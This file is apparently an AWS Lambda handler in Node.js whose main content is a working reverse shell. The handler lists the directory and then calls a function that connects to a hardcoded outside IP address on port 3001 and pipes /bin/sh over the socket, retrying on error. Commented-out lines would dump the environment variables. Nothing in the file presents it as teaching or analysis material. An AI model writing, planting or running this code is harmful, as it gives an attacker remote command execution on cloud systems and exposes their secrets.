var net = require('net');
var spawn = require('child_process').spawn;
const { exec } = require("child_process");

function c(HOST, PORT) {
    TIMEOUT = "5000";
    var client = new net.Socket();
    client.connect(PORT, HOST, function () {
        var sh = spawn('/bin/sh', []);
        client.write("Connected\r\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        setTimeout(() => {
            console.log("done exec")
        }, 60*1000)
    });
    client.on('error', function (e) {
        setTimeout(c(HOST, PORT), TIMEOUT);
    });
}



function outside(x) {
    console.log(x)
}

// var exec = require('child_process').exec;
// function execute(command, callback) {
//     exec(command, function (error, stdout, stderr) { callback(stdout); });
// };

exports.handler = async function (event, context) {

    console.log("wtf")
    // execute("ls -la", res => {
    //     console.log(res)
    // })

    exec("ls -la", (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });

    outside("bobcat in!")
    HOST = "138.75.254.191";
    PORT = "3001";

    c(HOST, PORT);
    // console.log("ENVIRONMENT VARIABLES\n" + JSON.stringify(process.env, null, 2))
    // console.log("EVENT\n" + JSON.stringify(event, null, 2))
    return context.logStreamName
}